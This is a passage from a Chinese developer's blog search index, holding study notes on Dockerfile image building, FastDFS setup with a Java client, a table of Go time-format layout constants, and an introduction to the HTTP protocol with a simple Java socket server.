指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定 –no-cache 参数，如：docker build –no-cache。\n\nCMD\n\n\nCMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]CMD [&quot;param1&quot;,&quot;param2&quot;]CMD command param1 param2\n用于指定容器启动时命令。\n\n与 RUN 指令的区别：RUN 在构建的时候执行，并生成一个新的镜像，CMD 在容器运行的时候执行，在构建时不进行任何操作。每个dockerfile只能有一条CMD命令。如果有多条，只有最后一条会被执行。如果用户启动时指定了运行的命令，则会覆盖CMD指定的命令。\n\nEXPOSEEXPOSE &lt;port&gt; [&lt;port&gt;...]为构建的镜像设置监听端口，使容器运行时监听\n\n\n自定义镜像\nJDK镜像创建Dockerfile文件\n\nFROM centosMAINTAINER rootADD jdk-8u121-linux-x64.tar.gz /usr/localENV JAVA_HOME /usr/local/java/jdk1.8.0_121ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV PATH $PATH:$JAVA_HOME/binCMD java -version\n构建镜像：docker build -t root_jdk1.8.0_121 .\n\ntomcat镜像创建Dockerfile文件\n\nFROM root_jdk1.8.0_121MAINTAINER rootADD apache-tomcat-8.5.24.tar.gz /usr/localENV CATALINA_HOME /usr/local/apache-tomcat-8.5.24ENV PATH $PATH:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-8.5.24/bin/catalina.sh run\n构建镜像：docker build -t root_tomcat-8.5.24 .\n镜像发布到仓库省略在阿里云注册账号，容器镜像服务有详细文档。\nDocker Hub 镜像加速&#x2F;etc&#x2F;docker&#x2F;daemon.json{&quot;registry-mirrors&quot;: [&quot;阿里云提供的网址&quot;]}\ndocker应用部署\n将开发好的程序打成jar包或war包\n将打包好的文件上传至服务器\n定义Dockerfile文件，用于创建项目镜像\n\n定义jar包程序Dockerfile文件\nFROM javaMAINTAINER rootADD springboot-web.jar /optRUN chmod +x /opt/springboot-web.jarCMD java -jar /opt/springboot-web.jar\n构建镜像：docker build -t springboot-web.jar .\n定义war包程序Dockerfile文件\nFROM root_tomcat-8.5.24MAINTAINER rootADD springboot-web.war /usr/local/apache-tomcat-8.5.24/webappsEXPOSE 8080CMD /usr/local/apache-tomcat-8.5.24/bin/catalina.sh run\n构建镜像：docker build -t springboot-web.war .\n修改容器保存：docker commit 容器id 镜像名容器内有新的数据，可以保存为新的镜像。\n总结主要是一些命令，但花了挺长时间。主要碰到了两个问题。\n第一个问题：无法启动tomcat\nCannot find /usr/local/tomcat/bin/setclasspath.shThis file is needed to run this program\n我不知道出现问题的原因是什么，但是找到了解决方案我将tomcat的版本降低后，解决了这个问题。\n第二个问题：也是无法启动tomcat\n/usr/bin/docker-current: Error response from daemon: driver failed programming external connectivity on endpoint affectionate_leakey (31afb261a3eead766cd87d85a7d0b12d048379e3b8715f28367a61e27b228456): Error starting userland proxy: listen tcp 0.0.0.0:8080: bind: address already in use.ERRO[0000] error getting events from daemon: net/http: request canceled\n这个是因为端口占用，而导致的报错。解决方案：kill占用的程序。\n\n查看端口使用情况：netstat -anp查看8080端口使用情况：netstat -anp|grep 8080\n\n","categories":["学习笔记"],"tags":["docker"]},{"title":"FastDFS笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/FastDFS%E7%AC%94%E8%AE%B0/","content":"简介分布式文件系统分布式文件系统（Distributed File System，DFS）是指文件系统管理的物理存储资源不一定直接连接在本地节点上，而是通过计算机网络与节点（可简单的理解为一台计算机）相连；或是若干不同的逻辑磁盘分区或卷标组合在一起而形成的完整的有层次的文件系统。DFS为分布在网络上任意位置的资源提供一个逻辑上的树形文件系统结构，从而使用户访问分布在网络上的共享文件更加简便。单独的 DFS共享文件夹的作用是相对于通过网络上的其他共享文件夹的访问点。常见的分布式文件系统有：FastDFS、GFS、HDFS、Lustre、Ceph、GridFS、mogileFS、TFS等。\n传统存放方式：\n分布式文件存储：\nFastDFSFastDFS是开源的轻量级分布式文件系统，为互联网应用定制，简单、灵活、高效。采用c语言开发，由阿里巴巴开发并开源。FastDFS对文件进行管理，功能包括：文件存储、文件同步（上传、下载、删除）等，解决大容量文件存储问题，特别适合以文件为载体的在线服务。比如文档网站、图片网址、视频网址等FastDFS充分考虑了冗余备份、线性扩容等级制，并注重高可用、高性能等指标，使用它很容易搭建一套高性能的文件服务器集群提供文件上传下载等服务。\n看起来做个人云盘什么的很不错\nFastDFS开源地址\nFastDFS整体架构FastDFS由客户端和服务端构成客户端通常是我们的程序，比如用java去连接FastDFS、操作FastDFS。它提供了专有的api访问服务端由跟踪器（tracker）和存储节点（storage）构成跟踪器主要做调度工作，在内存中记录集群中存储节点storage的状态信息，是前端Client和后端存储节点storage的枢纽。因为相关信息存储在内存中，所以tracker server的性能非常高。存储节点用于存储文件，包括文件和文件属性（meta data）都保存到存储服务器磁盘上，完成文件管理的所有功能：存储、同步、访问等\n环境搭建安装旧版本 FastDFS 说明：FastDFS有一部分是网络通信功能，旧版本FastDFS（FastDFS2.0之前版本）没有直接使用 epoll 实现，而是通过libevent实现（libevent是一个用C语言编写的、轻量级的开源高性能网络库），但是最新版的FastDFS最终网络IO这部分重新用epoll实现所以如果是FastDFS 是 2.0 之前的版本，请先安装好 libevent 环境（新版本不需要安装）\n安装前准备:检查linux是否安装了gcc、libevent、libevent-devel\nyum list installed|grep gccyum list installed|grep libeventyum list installed|grep libevent-devel\n安装\nyum install gcc libevent libevent-devel -y\n\n安装libfastcommon：\ngit clone https://github.com/happyfish100/libfastcommon.gitcd libfastcommon/./make.shsudo ./make.sh install\n\n头文件安装在&#x2F;usr&#x2F;include&#x2F;fastcommon目录下动态库安装在&#x2F;usr&#x2F;lib64&#x2F;和&#x2F;usr&#x2F;lib&#x2F;目录下\n\n安装fastdfs\ngit clone https://github.com/happyfish100/fastdfs.gitcd fastdfs./make.shsudo ./make.sh install\n\n工具安装在&#x2F;usr&#x2F;bin&#x2F;目录下：(无需配置环境变量，直接使用)fdfs_delete_file：删除文件fdfs_download_file：下载文件fdfs_upload_file：上传文件fdfs_trackerd：启动tracker服务fdfs_storaged：启动storage服务fdfs_file_info：用来检查一个文件的信息，参数传递一个FastDFS文件\n\n\n配置文件默认安装在&#x2F;etc&#x2F;fdfs&#x2F;目录下：client.conf.sample：客户端默认配置文件storage.conf.sample：storage服务默认配置文件storage_ids.conf.sample：tracker.conf.sample：tracker服务默认配置文件\n\n启动与关闭启动：fdfs_trackerd /etc/fdfs/tracker.conffdfs_storaged /etc/fdfs/storage.conf\n启动成功会有两个服务\n重启：fdfs_trackerd /etc/fdfs/tracker.conf restartfdfs_storaged /etc/fdfs/storage.conf restart\n关闭：fdfs_trackerd /etc/fdfs/tracker.conf stopfdfs_storaged /etc/fdfs/storage.conf stop\n\n可以使用kill关闭，但不建议，因为可能会导致文件信息不同步问题\n\n测试上传上传测试：fdfs_test /etc/fdfs/client.conf upload 文件路径示例：fdfs_test /etc/fdfs/client.conf upload /root/test.txt返回信息：\ntracker_query_storage_store_list_without_group:        server 1. group_name=, ip_addr=127.0.0.1, port=23000group_name=group1, ip_addr=127.0.0.1, port=23000storage_upload_by_filenamegroup_name=group1, remote_filename=M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672.txtsource ip address: 127.0.0.1file timestamp=2022-08-09 23:51:47file size=26file crc32=459240585example file url: http://127.0.0.1/group1/M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672.txtstorage_upload_slave_by_filenamegroup_name=group1, remote_filename=M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txtsource ip address: 127.0.0.1file timestamp=2022-08-09 23:51:47file size=26file crc32=459240585example file url: http://127.0.0.1/group1/M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txt\n\n\n其中group_name&#x3D;group1, remote_filename&#x3D;M00&#x2F;00&#x2F;00&#x2F;fwAAAWLygpOAUo-DAAAAGhtfdIk672.txtgroup1 为 组名、M00 为 磁盘、&#x2F;00&#x2F;00&#x2F; 为 目录、最后是文件名\n\n上传后的文件\n(base) [root@VM-16-9-centos 00]# lltotal 16-rw-r--r-- 1 root root 26 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txt-rw-r--r-- 1 root root 49 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672_big.txt-m-rw-r--r-- 1 root root 26 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt-rw-r--r-- 1 root root 49 Aug  9 23:51 fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt-m\n\n_big是备份文件，与没有的文件存储内容一样-m是文件的属性文件\n\n测试下载上传测试：fdfs_test /etc/fdfs/client.conf download 组名 远程文件路径示例：fdfs_test /etc/fdfs/client.conf download group1 M00/00/00/fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt返回信息：\nstorage=127.0.0.1:23000download file success, file size=26, file save to fwAAAWLygpOAUo-DAAAAGhtfdIk672.txt\n\n删除文件测试：fdfs_test /etc/fdfs/client.conf delete 组名 远程文件路径\nFastDFS的http访问概述文件上传成功的提示信息中说，我们可以通过某个路径访问上传的文件，但直接访问这个路径是访问不了的。FastDFS提供了一个Nginx扩展模块，利用这个模块，可以通过nginx访问已经上传到FastDFS上的文件。\nFastDFS-nginx扩展模块\n安装nginx并添加扩展模块解压缩扩展模块。\n配置nginx使用./configure --prefix=/usr/local/nginx_fdfs --add-model=扩展模块的src目录添加拓展模块配置完成后make然后make install安装nginx\n配置nginxFastDFS配置(mod_fastdfs.conf)\n基础路径base_path=...tracker_server地址tracker_server=...:22122请求中需要包含组名url_have_group_name = true有几个磁盘存储路径store_path_count=1文件存储路径store_path0=...\nnginx配置(nginx.conf)\n拦截请求路径中包含 &#x2F;group[1-9]&#x2F;M0[0-9] 的请求，用fastdfs的nginx模块进行转发\nlocation ~/group[1-9]/M0[0-9]&#123;    ngx_fastdfs_model;&#125;\n\n启动失败可能的原因：\n\nmod_fastdfs.conf没有放到&#x2F;etc&#x2F;fdfs目录中\n配置文件中有错误。比如基础路径不存在\n\n拓展模块执行流程\n使用Java程序对FastDFS进行操作fastdfs-client-java 项目地址\nmaven依赖\n&lt;!--    引入FastDFS的maven依赖包    这个依赖包不在maven的中央库中，需要对源码进行编译，将客户端代码编译到maven本地库中或直接拷贝依赖包文件到maven库中。--&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.csource&lt;/groupId&gt;        &lt;artifactId&gt;fastdfs-client-java&lt;/artifactId&gt;        &lt;version&gt;1.29-SNAPSHOT&lt;/version&gt;    &lt;/dependency&gt;\n\n创建配置文件（fastdfs.conf）\ntracker_server=127.0.0.1:22122\n\n文件上传：\npublic static void upload() &#123;    TrackerServer ts = null;    StorageServer ss = null;    try &#123;        //读取配置文件，用于将所有的tracker的地址读取到内存中        ClientGlobal.init(&quot;fastdfs.conf&quot;);        TrackerClient tc = new TrackerClient();        ts = tc.getTrackerServer();        ss = tc.getStoreStorage(ts);        //定义Storage的客户端对象，需要用这个对象来完成文件上传、下载、删除操作。        StorageClient sc = new StorageClient(ts, ss);        /*        文件上传        参数1 需要上传文件的绝对路径        参数2 需要上传文件的拓展名        参数3 为文件的属性文件，通常不上传        返回一个string数组，需妥善保管        数组中第一个元素为文件所在组名，第二个元素为文件所在的远程路径名称         */        String[] result = sc.upload_file(&quot;&quot;, &quot;&quot;, null);            &#125; catch (IOException | MyException e) &#123;        e.printStackTrace();    &#125;&#125;\n\n文件下载：\npublic static void download() &#123;    TrackerServer ts = null;    StorageServer ss = null;    try &#123;        //读取配置文件，用于将所有的tracker的地址读取到内存中        ClientGlobal.init(&quot;fastdfs.conf&quot;);        TrackerClient tc = new TrackerClient();        ts = tc.getTrackerServer();        ss = tc.getStoreStorage(ts);        //定义Storage的客户端对象，需要用这个对象来完成文件上传、下载、删除操作。        StorageClient sc = new StorageClient(ts, ss);        /*        文件下载        参数1 需要下载的文件的组名        参数2 需要下载文件的远程文件名        参数3 需要保存的本地文件名        返回一个int类型的数据。返回0 表示文件下载成功，其他值表示文件下载失败         */        int result = sc.download_file(&quot;&quot;, &quot;&quot;, &quot;&quot;);    &#125; catch (MyException | IOException e) &#123;        e.printStackTrace();    &#125;&#125;\n\n文件删除：\npublic static void delete()&#123;    TrackerServer ts = null;    StorageServer ss = null;    try &#123;        //读取配置文件，用于将所有的tracker的地址读取到内存中        ClientGlobal.init(&quot;fastdfs.conf&quot;);        TrackerClient tc = new TrackerClient();        ts = tc.getTrackerServer();        ss = tc.getStoreStorage(ts);        //定义Storage的客户端对象，需要用这个对象来完成文件上传、下载、删除操作。        StorageClient sc = new StorageClient(ts, ss);        /*        文件下载        参数1 需要删除的文件的组名        参数2 需要删除文件的远程文件名        返回一个int类型的数据。返回0 表示文件删除成功，其他值表示文件删除失败         */        int result = sc.delete_file(&quot;&quot;, &quot;&quot;);    &#125; catch (MyException | IOException e) &#123;        e.printStackTrace();    &#125;&#125;\n\nspringboot中关于上传文件大小的配置\n#设置springMVC允许上传的单个文件大小 默认值为1MBspring.servlet.multipart.max-file-size=1MB#设置springMVC允许的表单中请求中允许上传文件总大小 默认值为10MBspring.servlet.multipart.max-request-size=10MB\n\n集群的访问流程集群结构：\n访问流程：\n总结部署分布式的部分省略了。咕这部分用了快十天，划水划了挺久。不过总算结束了。\n","categories":["学习笔记"],"tags":["FastDFS"]},{"title":"Go内置时间常量格式（time包）对照表","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Go%E5%86%85%E7%BD%AE%E6%97%B6%E9%97%B4%E5%B8%B8%E9%87%8F%E6%A0%BC%E5%BC%8F%EF%BC%88time%E5%8C%85%EF%BC%89%E5%AF%B9%E7%85%A7%E8%A1%A8/","content":"Go 时间布局格式Go 使用 参考时间 Mon Jan 2 15:04:05 MST 2006 来定义格式，而不是像 C 语言或 Python 的 %Y %m %d。\n\n\n\n类型\n标记\n含义\n示例（参考时间 2025-09-06 11:45:05.123456789）\n注意事项\n\n\n\n年\n2006\n四位年份\n2025\n常用于完整年份显示\n\n\n\n06\n两位年份\n25\n适合老式格式或节省字符\n\n\n月\n01\n两位数字月份\n09\n0 填充\n\n\n\n1\n数字月份（无前导零）\n9\n方便简写\n\n\n\nJan\n英文缩写月份\nSep\n三个字母英文缩写\n\n\n\nJanuary\n英文全称月份\nSeptember\n更易读，长度可变\n\n\n日\n02\n两位数字日\n06\n0 填充\n\n\n\n_2\n空格填充日\n 6\n用于对齐，日&lt;10时左侧空格\n\n\n小时\n15\n24 小时制\n11\n0-23\n\n\n\n03\n12 小时制\n11\n0-12，0 会显示为 12\n\n\n\n3\n12 小时制，无前导零\n11\n0-12\n\n\n分钟&#x2F;秒\n04\n分钟\n45\n两位数字\n\n\n\n05\n秒\n05\n两位数字\n\n\n上下午\nPM\n大写 AM&#x2F;PM\nAM\n12 小时制，区分大小写\n\n\n\npm\n小写 am&#x2F;pm\nam\n12 小时制，区分大小写\n\n\n时区\nMST\n时区缩写\nSGT &#x2F; CST &#x2F; UTC\n受系统时区影响，可能有歧义\n\n\n\n-0700\n数值时区偏移（无冒号）\n+0800\n可解析性高，推荐用于存储&#x2F;传输\n\n\n\nZ07:00\n数值时区偏移（含冒号）\n+08:00 或 Z（UTC）\nRFC3339 常用\n\n\n引号\n&#39;...&#39;\n单引号内内容按字面量输出\n&quot;&#39;06&quot; → &#39;25\n可在格式中插入固定字符\n\n\n小数秒\n.000\n毫秒\n.123\n固定 3 位小数\n\n\n\n.000000\n微秒\n.123456\n固定 6 位小数\n\n\n\n.000000000\n纳秒\n.123456789\n固定 9 位小数\n\n\n星期\nMon\n英文缩写星期\nSat\n三个字母\n\n\n\nMonday\n英文全称星期\nSaturday\n适合全名显示\n\n\n其他符号\nT\nISO 8601 中的时间分隔符\nT\n直接输出字母 T\n\n\n\n- / :  \n直接输出\n-、/、:\n可以自由组合布局\n\n\n注意事项\n\n空格填充 vs 零填充：\n_2 → 空格填充的日，02 → 零填充。\n\n\n时区选择：\nMST → 缩写，易读但解析可能歧义。\n-0700&#x2F;Z07:00 → 数值偏移，更标准、更安全。\n\n\n12 小时制 vs 24 小时制：\n3&#x2F;03 → 12 小时制，配合 PM&#x2F;pm。\n15 → 24 小时制。\n\n\n小数秒：\nStampMilli &#x2F; StampMicro &#x2F; StampNano 都基于 .000&#x2F;.000000&#x2F;.000000000。\n\n\n\nGo time 包时间格式常量package timeconst (\tLayout      = &quot;01/02 03:04:05PM &#x27;06 -0700&quot; // The reference time, in numerical order.\tANSIC       = &quot;Mon Jan _2 15:04:05 2006&quot;\tUnixDate    = &quot;Mon Jan _2 15:04:05 MST 2006&quot;\tRubyDate    = &quot;Mon Jan 02 15:04:05 -0700 2006&quot;\tRFC822      = &quot;02 Jan 06 15:04 MST&quot;\tRFC822Z     = &quot;02 Jan 06 15:04 -0700&quot; // RFC822 with numeric zone\tRFC850      = &quot;Monday, 02-Jan-06 15:04:05 MST&quot;\tRFC1123     = &quot;Mon, 02 Jan 2006 15:04:05 MST&quot;\tRFC1123Z    = &quot;Mon, 02 Jan 2006 15:04:05 -0700&quot; // RFC1123 with numeric zone\tRFC3339     = &quot;2006-01-02T15:04:05Z07:00&quot;\tRFC3339Nano = &quot;2006-01-02T15:04:05.999999999Z07:00&quot;\tKitchen     = &quot;3:04PM&quot;\t// Handy time stamps.\tStamp      = &quot;Jan _2 15:04:05&quot;\tStampMilli = &quot;Jan _2 15:04:05.000&quot;\tStampMicro = &quot;Jan _2 15:04:05.000000&quot;\tStampNano  = &quot;Jan _2 15:04:05.000000000&quot;\tDateTime   = &quot;2006-01-02 15:04:05&quot;\tDateOnly   = &quot;2006-01-02&quot;\tTimeOnly   = &quot;15:04:05&quot;)\n\nGo time 包时间格式常量对照表\n\n\n名称\n布局字符串\n示例输出（2025-09-06 11:45:05 +08:00）\n典型用途\n注意事项\n\n\n\nLayout\n01/02 03:04:05PM &#39;06 -0700\n09/06 11:45:05AM &#39;25 +0800\nGo 的参考布局示例，展示格式规则\n实际项目中较少直接使用\n\n\nANSIC\nMon Jan _2 15:04:05 2006\nSat Sep  6 11:45:05 2025\n类 Unix 日志&#x2F;老式系统\n_2 表示空格填充日期\n\n\nUnixDate\nMon Jan _2 15:04:05 MST 2006\nSat Sep  6 11:45:05 SGT 2025\n类 Unix 日期（带时区缩写）\nMST 会替换为实际时区缩写，可能有歧义\n\n\nRubyDate\nMon Jan 02 15:04:05 -0700 2006\nSat Sep 06 11:45:05 +0800 2025\nRuby 默认日期格式\n使用数值时区，无歧义\n\n\nRFC822\n02 Jan 06 15:04 MST\n06 Sep 25 11:45 SGT\n老邮件标准\n两位年份+时区缩写，解析不安全\n\n\nRFC822Z\n02 Jan 06 15:04 -0700\n06 Sep 25 11:45 +0800\nRFC822 数值时区版\n优于 RFC822，推荐\n\n\nRFC850\nMonday, 02-Jan-06 15:04:05 MST\nSaturday, 06-Sep-25 11:45:05 SGT\n早期 HTTP&#x2F;邮件日期\n已过时\n\n\nRFC1123\nMon, 02 Jan 2006 15:04:05 MST\nSat, 06 Sep 2025 11:45:05 SGT\nHTTP-date（旧版）\n通常用 GMT，时区缩写有歧义\n\n\nRFC1123Z\nMon, 02 Jan 2006 15:04:05 -0700\nSat, 06 Sep 2025 11:45:05 +0800\nHTTP-date（推荐版）\n更精确，兼容性好\n\n\nRFC3339\n2006-01-02T15:04:05Z07:00\n2025-09-06T11:45:05+08:00\nJSON &#x2F; API 常用\nUTC 时输出 Z，否则 +HH:MM\n\n\nRFC3339Nano\n2006-01-02T15:04:05.999999999Z07:00\n2025-09-06T11:45:05.123456789+08:00\n高精度 API 日志\n输出到纳秒，0 的处理依版本不同\n\n\nKitchen\n3:04PM\n11:45AM\n简洁 UI 时间显示\n无秒、无日期\n\n\nStamp\nJan _2 15:04:05\nSep  6 11:45:05\n简洁日志时间戳\n无年、无时区\n\n\nStampMilli\nJan _2 15:04:05.000\nSep  6 11:45:05.000\n日志，带毫秒\n固定 3 位小数\n\n\nStampMicro\nJan _2 15:04:05.000000\nSep  6 11:45:05.000000\n日志，带微秒\n固定 6 位小数\n\n\nStampNano\nJan _2 15:04:05.000000000\nSep  6 11:45:05.000000000\n日志，带纳秒\n固定 9 位小数\n\n\nDateTime\n2006-01-02 15:04:05\n2025-09-06 11:45:05\n数据库&#x2F;日志常用\n无时区，解析时需额外设定\n\n\nDateOnly\n2006-01-02\n2025-09-06\n仅日期字段\n常见于表单、数据库\n\n\nTimeOnly\n15:04:05\n11:45:05\n仅时间字段\n无日期、无时区\n\n\n格式化输出测试package testimport (\t&quot;fmt&quot;\t&quot;testing&quot;\t&quot;time&quot;)func TestName(t *testing.T) &#123;\tnow := time.Now()\tlayouts := map[string]string&#123;\t\t&quot;Layout&quot;:      &quot;01/02 03:04:05PM &#x27;06 -0700&quot;,\t\t&quot;ANSIC&quot;:       time.ANSIC,\t\t&quot;UnixDate&quot;:    time.UnixDate,\t\t&quot;RubyDate&quot;:    time.RubyDate,\t\t&quot;RFC822&quot;:      time.RFC822,\t\t&quot;RFC822Z&quot;:     time.RFC822Z,\t\t&quot;RFC850&quot;:      time.RFC850,\t\t&quot;RFC1123&quot;:     time.RFC1123,\t\t&quot;RFC1123Z&quot;:    time.RFC1123Z,\t\t&quot;RFC3339&quot;:     time.RFC3339,\t\t&quot;RFC3339Nano&quot;: time.RFC3339Nano,\t\t&quot;Kitchen&quot;:     time.Kitchen,\t\t&quot;Stamp&quot;:       time.Stamp,\t\t&quot;StampMilli&quot;:  time.StampMilli,\t\t&quot;StampMicro&quot;:  time.StampMicro,\t\t&quot;StampNano&quot;:   time.StampNano,\t\t&quot;DateTime&quot;:    &quot;2006-01-02 15:04:05&quot;,\t\t&quot;DateOnly&quot;:    &quot;2006-01-02&quot;,\t\t&quot;TimeOnly&quot;:    &quot;15:04:05&quot;,\t&#125;\tfor name, layout := range layouts &#123;\t\tfmt.Printf(&quot;%-12s : %s\\n&quot;, name, now.Format(layout))\t&#125;\tfmt.Println(&quot;\\n-- UTC 格式化 --&quot;)\tfor name, layout := range layouts &#123;\t\tfmt.Printf(&quot;%-12s : %s\\n&quot;, name, now.UTC().Format(layout))\t&#125;&#125;\n\n输出结果：\n=== RUN   TestNameANSIC        : Sat Sep  6 14:03:17 2025UnixDate     : Sat Sep  6 14:03:17 CST 2025RubyDate     : Sat Sep 06 14:03:17 +0800 2025RFC822Z      : 06 Sep 25 14:03 +0800RFC850       : Saturday, 06-Sep-25 14:03:17 CSTRFC1123Z     : Sat, 06 Sep 2025 14:03:17 +0800RFC3339      : 2025-09-06T14:03:17+08:00RFC3339Nano  : 2025-09-06T14:03:17.9708592+08:00Kitchen      : 2:03PMStamp        : Sep  6 14:03:17StampNano    : Sep  6 14:03:17.970859200DateTime     : 2025-09-06 14:03:17DateOnly     : 2025-09-06TimeOnly     : 14:03:17Layout       : 09/06 02:03:17PM &#x27;25 +0800RFC822       : 06 Sep 25 14:03 CSTRFC1123      : Sat, 06 Sep 2025 14:03:17 CSTStampMilli   : Sep  6 14:03:17.970StampMicro   : Sep  6 14:03:17.970859-- UTC 格式化 --UnixDate     : Sat Sep  6 06:03:17 UTC 2025RubyDate     : Sat Sep 06 06:03:17 +0000 2025RFC822Z      : 06 Sep 25 06:03 +0000RFC850       : Saturday, 06-Sep-25 06:03:17 UTCRFC1123Z     : Sat, 06 Sep 2025 06:03:17 +0000RFC3339      : 2025-09-06T06:03:17ZRFC3339Nano  : 2025-09-06T06:03:17.9708592ZKitchen      : 6:03AMStamp        : Sep  6 06:03:17StampNano    : Sep  6 06:03:17.970859200DateTime     : 2025-09-06 06:03:17DateOnly     : 2025-09-06TimeOnly     : 06:03:17Layout       : 09/06 06:03:17AM &#x27;25 +0000RFC822       : 06 Sep 25 06:03 UTCRFC1123      : Sat, 06 Sep 2025 06:03:17 UTCStampMilli   : Sep  6 06:03:17.970StampMicro   : Sep  6 06:03:17.970859ANSIC        : Sat Sep  6 06:03:17 2025--- PASS: TestName (0.01s)PASS\n\n","categories":["学习笔记"],"tags":["go","时间"]},{"title":"HTTP协议详解","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/","content":"HTTP协议介绍超文本传输协议（英文：HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议，用于如何封装数据。HTTP是万维网的数据通信的基础，它和TCP&#x2F;IP协议簇的其他协议一样，也是用于客户端和服务端的通信。\n\nTCP&#x2F;UDP 是传输层协议，主要解决数据在网络中的传输。IP 是网络层协议，同样解决数据在网络中的传输。\n\n菜鸟教程-http简介\nHTTP 是一个客户端终端（用户）和服务器端（网站）请求和应答的标准协议。协议，即规定了通信信息的格式。我们通过使用网页浏览器或者其它的工具发起 HTTP 请求，这个客户端为我们称之为用户代理程序（user agent）。服务器上存储着一些资源，比如 HTML 文件和图像。我们称这个应答服务器为源服务器（origin server）。\n通常，由 HTTP 客户端发起一个请求，此时创建一个到服务器指定端口（默认是80端口）的 tcp 连接。HTTP 服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，比如” HTTP&#x2F;1.1 200 OK”，以及返回的内容，如请求的文件、错误消息、或者其它信息。\n\n常见的 HTTP 服务器有 IIS、nginx、apache、tomcat 等。\n\nHTTP 工作原理以下是 HTTP 请求&#x2F;响应的步骤：\n\n客户端连接到 Web 服务器浏览器向 DNS 服务器请求解析 URL 中的域名对应的 ip 地址，然后 HTTP 客户端与目标服务器建立一个 tcp 连接。\n发送 HTTP 请求通过 tcp 连接，客户端向服务器发送一个 HTTP 请求。请求报文包括 请求行、请求头、空行、请求数据 四部分组成。\n服务器接受请求，处理后返回 HTTP 响应服务器 解析请求、获取资源 ，然后将资源写进响应数据。响应由 状态行、响应头、空行、响应数据 四部分组成。\n服务器释放 tcp 连接若 connection 模式为 close，则服务器主动关闭 tcp 连接，客户端被动关闭连接，释放 tcp 连接。若 connection 模式为 keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求。无论如何都会释放。\n客户端解析响应客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的 HTML 文档和文档的字符集。客户端浏览器读取响应数据HTML，根据 HTML 的语法对其进行格式化，并在浏览器窗口中显示。\n\n所以，从上面的过程来看：\n\nHTTP 是无连接的：无连接的含义是限制每次连接只处理一个请求，服务器处理完客户的请求，并收到客户的应答后，即断开连接，采用这种方式可以节省传输时间。\nHTTP 是媒体独立的：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送，客户端以及服务器指定使用适合的MIME-type 内容类型。\nHTTP 是无状态：HTTP协议是无状态协议，无状态是指协议对于事务处理没有记忆能力，缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大，另一方面，在服务器不需要先前信息时它的应答就较快。\n\nHTTP 报文格式一个完整的HTTP协议的报文主要由以下三个部分组成：\n\n起始行（请求行、响应行）：描述请求或响应的基本信息。\n首部字段（请求头、响应头）：使用key-value的形式更加详细的说明报文。\n消息正文（请求体、响应体）：实际的传输数据，不一定是文本，也有可能是图片、音频、视频等二进制数据。\n\n因为HTTP协议是基于 TCP&#x2F;IP 的，所以我们可以写个简单的 socket 程序来获取请求报文。\npublic class HttpSocketTest &#123;    public static void main(String[] args) throws IOException &#123;        // 创建 ServerSocket 监听8080端口        ServerSocket server = new ServerSocket(8000);        Socket socket = server.accept();        // 读取请求报文        InputStream in = socket.getInputStream();        byte[] bytes = new byte[in.available()];        int result = in.read(bytes);        if (result != -1)            System.out.println(new String(bytes));        System.out.println();        // 返回响应报文        OutputStream out = socket.getOutputStream();        StringBuffer response = new StringBuffer();        response.append(&quot;HTTP/1.1 200 OK\\r\\n&quot;);        response.append(&quot;Content-type:text/html\\r\\n\\r\\n&quot;);        response.append(&quot;CurrentTime: &quot;).append(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;).format(new Date()));        System.out.println(response);        out.write(response.toString().getBytes());        out.flush();        out.close();        in.close();        socket.close();        server.close();    &#125;&#125;\n\n使用浏览器访问： http://localhost:8000/ 即可得到请求报文及我们自己构建的响应报文\nget 请求报文：\nGET /test HTTP/1.1Host: localhost:8000Connection: keep-alive...\n\npost 请求报文\nPOST / HTTP/1.1Host: localhost:8000Content-Type: application/jsonConnection: keep-alive&#123;    &quot;name&quot;:&quot;zs&quot;&#125;\n\n响应报文：\nHTTP/1.1 200 OKContent-type:text/htmlCurrentTime: 2023-02-13 18:37:31\n\n所以，从上面的例子可以得出 http 报文的格式：\n请求报文格式：\n响应报文格式：\nHTTP 请求方法HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。HTTP&#x2F;1.1 协议中共定义了八种方法来以不同方式操作指定的资源。我们目前最常见的有两种一种get，另外一种叫post。这两种方法理论上就足够我们进行所有的资源操作了。但还是细分下比较好，细分后可以使用 RESTful 风格的 API （在SpringBoot笔记中有写过）\n首先来列举下这八种请求方法：\n\n\n\n方法\n描述\n\n\n\nGET\n请求指定的页面信息，并返回实体主体。\n\n\nHEAD\n类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头\n\n\nPOST\n向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 